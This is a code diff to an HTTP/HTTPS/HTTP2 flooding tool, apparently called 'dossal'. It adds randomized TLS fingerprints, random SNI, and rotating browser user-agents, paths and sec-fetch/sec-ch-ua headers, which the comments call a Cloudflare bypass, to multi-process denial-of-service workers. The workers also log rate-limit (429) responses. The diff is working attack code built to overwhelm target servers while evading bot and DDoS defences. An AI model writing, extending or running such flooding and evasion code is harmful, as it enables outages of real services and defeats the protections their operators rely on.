@@ -334,43 +334,99 @@ async def http_worker(name, url, stats, duration, stop, payload_size=0):
     if writer.transport:
         writer.transport.abort()
 
+def _make_tls_ctx(proc_idx):
+    """Create a TLS context with randomized fingerprint (JA3 variation).
+    Each process gets a slightly different cipher/ALPN/protocol config."""
+    import ssl as _ssl
+    import random as _rnd
+    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    
+    # Randomize cipher list (order matters for JA3)
+    ciphers = [
+        'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256',
+        'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
+        'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
+        'DHE-RSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES128-GCM-SHA256',
+        'ECDHE-ECDSA-AES128-GCM-SHA256', 'DHE-RSA-AES128-GCM-SHA256',
+    ]
+    # Shuffle a random subset
+    _rnd.shuffle(ciphers)
+    subset = ciphers[:_rnd.randint(4, 10)]
+    try:
+        ctx.set_ciphers(':'.join(subset))
+    except Exception:
+        pass
+    
+    # Randomize ALPN
+    alpn_options = [
+        ['h2', 'http/1.1'],
+        ['http/1.1'],
+        ['h2'],
+        [],
+    ]
+    alpn = _rnd.choice(alpn_options)
+    if alpn:
+        try:
+            ctx.set_alpn_protocols(alpn)
+        except Exception:
+            pass
+    
+    # Randomize minimum TLS version
+    min_tls_options = [_ssl.TLSVersion.TLSv1_2, _ssl.TLSVersion.TLSv1_3]
+    if _rnd.random() < 0.7:
+        ctx.minimum_version = _ssl.TLSVersion.TLSv1_2
+    else:
+        ctx.minimum_version = _ssl.TLSVersion.TLSv1_3
+    
+    return ctx
+
 def _mp_https_flood(args_tuple):
-    """Multi-process HTTPS flooder: TLS + HTTP in a child process."""
+    """Multi-process HTTPS flooder: TLS + HTTP with randomized fingerprint."""
     import time as _time
     import ssl as _ssl
     import socket as _socket
-    host, port, path, duration = args_tuple
+    import random as _rnd
+    if len(args_tuple) == 5:
+        host, port, path, duration, proc_idx = args_tuple
+    else:
+        host, port, path, duration = args_tuple
+        proc_idx = 0
     sent = 0
     errors = 0
-    # TLS handshake with retry
+    # TLS handshake with retry + randomized fingerprint
     ssock = None
     for attempt in range(3):
         try:
-            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
-            ctx.check_hostname = False
-            ctx.verify_mode = _ssl.CERT_NONE
+            ctx = _make_tls_ctx(proc_idx + attempt * 100)
             raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
             raw.settimeout(5.0)
             raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
             raw.connect((host, port))
-            ssock = ctx.wrap_socket(raw, server_hostname=host)
+            # Random SNI (sometimes use IP, sometimes hostname)
+            sni = host if _rnd.random() < 0.8 else None
+            ssock = ctx.wrap_socket(raw, server_hostname=sni)
             break
         except Exception:
             try:
                 raw.close()
             except Exception:
                 pass
-            _time.sleep(0.5)
+            _time.sleep(0.3)
     if ssock is None:
         return 0, 1
     
-    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
-           f"Connection: keep-alive\r\n"
-           f"User-Agent: dossal/3.16\r\n\r\n").encode()
+    # Use randomized HTTP request
+    req = _random_http_req(host, path)
+    req_counter = 0
     
     end = _time.time() + duration
     while _time.time() < end:
         try:
+            req_counter += 1
+            if req_counter % 500 == 0:
+                req = _random_http_req(host, path)
             ssock.sendall(req)
             data = ssock.recv(65535)
             if not data:
@@ -391,7 +447,8 @@ async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
     
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
-    targets = [(host, port, path, duration)] * n_procs
+    # Each process gets a unique index for TLS fingerprint variation
+    targets = [(host, port, path, duration, i) for i in range(n_procs)]
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_https_flood, targets)
     
@@ -673,24 +730,44 @@ async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
         conn.receive_data(data)
     except Exception:
         pass
-    headers = [
-        (':method', 'GET'),
-        (':scheme', 'https'),
-        (':authority', host),
-        (':path', path),
-        ('user-agent', f'dossal/{VERSION}'),
-    ]
+    # Header pool for H2 (CF bypass: sec-fetch-*, sec-ch-ua)
+    import random as _rnd
+    def _h2_headers():
+        uas = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
+        ]
+        paths = [path, '/', '/index.html', '/api', '/static/app.js', '/favicon.ico']
+        return [
+            (':method', 'GET'),
+            (':scheme', 'https'),
+            (':authority', host),
+            (':path', _rnd.choice(paths)),
+            ('user-agent', _rnd.choice(uas)),
+            ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
+            ('accept-language', _rnd.choice(['en-US,en;q=0.9', 'ko-KR,ko;q=0.9'])),
+            ('sec-fetch-dest', 'document'),
+            ('sec-fetch-mode', 'navigate'),
+            ('sec-fetch-site', 'none'),
+            ('sec-fetch-user', '?1'),
+            ('upgrade-insecure-requests', '1'),
+        ]
+    
     # Batched h2: send N requests, then drain responses
     import os as _os
     BATCH = int(_os.environ.get('DOSSAL_H2_BATCH', '32'))
     error = None
+    h2_429 = 0
     while not stop.is_set():
         try:
+            # Randomize headers per batch
+            batch_headers = _h2_headers()
             for _ in range(BATCH):
                 if stop.is_set():
                     break
                 stream_id = conn.get_next_available_stream_id()
-                conn.send_headers(stream_id, headers, end_stream=True)
+                conn.send_headers(stream_id, batch_headers, end_stream=True)
             data = conn.data_to_send()
             if data:
                 writer.write(data)
@@ -709,10 +786,18 @@ async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
                 for event in events:
                     if isinstance(event, DataReceived):
                         stats.bytes += len(event.data)
+                    elif isinstance(event, ResponseReceived):
+                        # h2 headers are list of (name, value) tuples
+                        for hname, hval in event.headers:
+                            if hname == ':status' and hval == '429':
+                                h2_429 += 1
+                                break
         except Exception as e:
             stats.errors += 1
             error = e
             break
+    if h2_429 > 0:
+        print(f"[h2] {h2_429} 429 responses received", file=sys.stderr)
     if writer.transport:
         writer.transport.abort()
 
@@ -955,7 +1040,33 @@ def _random_http_req(host, path):
     if _rnd.random() < 0.2:
         headers['Referer'] = f'http://{host}/'
     
-    # Random header order
+    # Cloudflare bypass: sec-fetch-*, sec-ch-ua, consistent browser headers
+    sec_ch_ua = _rnd.choice([
+        '"Chromium";v="120", "Google Chrome";v="120", "Not_A Brand";v="24"',
+        '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        '"Chromium";v="119", "Not?A_Brand";v="24"',
+        '"Chromium";v="121", "Google Chrome";v="121"',
+    ])
+    headers['sec-ch-ua'] = sec_ch_ua
+    headers['sec-ch-ua-mobile'] = '?0'
+    headers['sec-ch-ua-platform'] = _rnd.choice(['"Windows"', '"macOS"', '"Linux"'])
+    headers['Sec-Fetch-Dest'] = 'document'
+    headers['Sec-Fetch-Mode'] = 'navigate'
+    headers['Sec-Fetch-Site'] = _rnd.choice(['none', 'same-origin', 'cross-site'])
+    headers['Sec-Fetch-User'] = '?1'
+    # Upgrade-Insecure-Requests (browsers send this)
+    if _rnd.random() < 0.6:
+        headers['Upgrade-Insecure-Requests'] = '1'
+    # Accept-Encoding (vary)
+    headers['Accept-Encoding'] = _rnd.choice(['gzip, deflate, br', 'gzip, deflate', 'gzip'])
+    # If-Modified-Since (cache-buster variation)
+    if _rnd.random() < 0.3:
+        import time as _t
+        ts = _t.time() - _rnd.randint(3600, 86400)
+        from email.utils import formatdate
+        headers['If-Modified-Since'] = formatdate(timeval=ts, usegmt=True)
+    
+    # Random header order (browsers don't always send in same order)
     hkeys = list(headers.keys())
     _rnd.shuffle(hkeys)
     header_str = ''.join(f"{k}: {headers[k]}\r\n" for k in hkeys)
